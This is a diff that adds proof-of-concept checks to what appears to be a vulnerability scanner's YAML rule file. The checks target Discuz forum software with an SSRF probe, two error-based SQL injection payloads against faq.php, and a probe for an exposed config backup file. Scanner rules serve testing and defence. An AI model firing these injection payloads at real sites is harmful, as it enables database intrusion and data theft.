@@ -284,3 +284,30 @@ pocs:
         - 'jdbc:mysql://'
       matchers-condition: or
       name: "BC file read vuln"
+    - metch: "get"
+      path: '/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://dns/1.jpg[/img]'
+      body:
+        - 'parent.updateDownImageList'
+      matchers-condition: or
+      name: "Discuz ssrf vuln"
+    - metch: "get"
+      path: '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema%20.tables%20group%20by%20x)a)%23'
+      body:
+        - 'MySQL Query Error'
+      matchers-condition: or
+      name: "Discuz sql vuln"
+    - metch: "get"
+      path: '/faq.php?action=grouppermission&gids[80]=%27&gids[81][0]=)%20and%20updatexml(1,concat(0x7e,(select%20@@version)),1)%23'
+      body:
+        - 'MySQL Query Error'
+      matchers-condition: or
+      name: "Discuz sql vuln"
+    - metch: "get"
+      path: '/config/config_global.php.bak'
+      body:
+        - 'CONFIG DB '
+        - 'CONFIG MEMORY'
+        - 'CONFIG SECURITY'
+        - '$_config'
+      matchers-condition: or
+      name: "web bak info vuln"
